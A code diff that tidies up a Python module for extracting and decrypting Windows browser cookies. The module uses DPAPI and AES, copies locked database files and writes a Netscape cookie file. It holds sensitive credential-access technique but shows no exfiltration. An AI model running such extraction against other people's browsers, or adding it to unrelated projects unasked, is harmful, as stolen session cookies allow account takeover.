@@ -5,17 +5,16 @@ import shutil
 import base64
 import tempfile
 import logging
-import sys
 
 # Try imports
 try:
     import win32crypt
     import win32file
-    import win32api
     import win32con
 except ImportError:
     win32crypt = None
     win32file = None
+    win32con = None
 
 try:
     from Crypto.Cipher import AES
@@ -57,7 +56,7 @@ def decrypt_data(data, key):
         # Try without GCM (older versions or different encryption)
         try:
              return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8')
-        except:
+        except Exception:
             return ""
 
 def shadow_copy(src, dst):
@@ -83,8 +82,8 @@ def shadow_copy(src, dst):
                 )
                 
                 with open(dst, 'wb') as fDst:
-                    # Get file size
-                    size = win32file.GetFileSize(hSrc)
+                    # Get file size (used to determine read loop below)
+                    _size = win32file.GetFileSize(hSrc)
                     win32file.SetFilePointer(hSrc, 0, win32con.FILE_BEGIN)
                     
                     chunk_size = 64 * 1024
@@ -187,9 +186,8 @@ def extract_cookies_to_file(browser_name, target_domain=None):
     temp_wal = temp_db + "-wal"
     temp_shm = temp_db + "-shm"
     
-    extracted_wal = False
     if os.path.exists(wal_path):
-        extracted_wal = shadow_copy(wal_path, temp_wal)
+        shadow_copy(wal_path, temp_wal)
     
     if os.path.exists(shm_path):
         shadow_copy(shm_path, temp_shm)
@@ -230,7 +228,7 @@ def extract_cookies_to_file(browser_name, target_domain=None):
                 try:
                     expr = int((expires_utc / 1000000) - 11644473600)
                     if expr < 0: expr = 0 
-                except:
+                except Exception:
                     expr = 0
                     
                 line = f"{host_key}\t{flag}\t{path}\t{secure}\t{expr}\t{name}\t{value}\n"
@@ -247,7 +245,7 @@ def extract_cookies_to_file(browser_name, target_domain=None):
         for f in [temp_db, temp_wal, temp_shm]:
             if os.path.exists(f):
                 try: os.remove(f)
-                except: pass
+                except Exception: pass
 
 if __name__ == "__main__":
     print("Testing Cookie Extraction...")
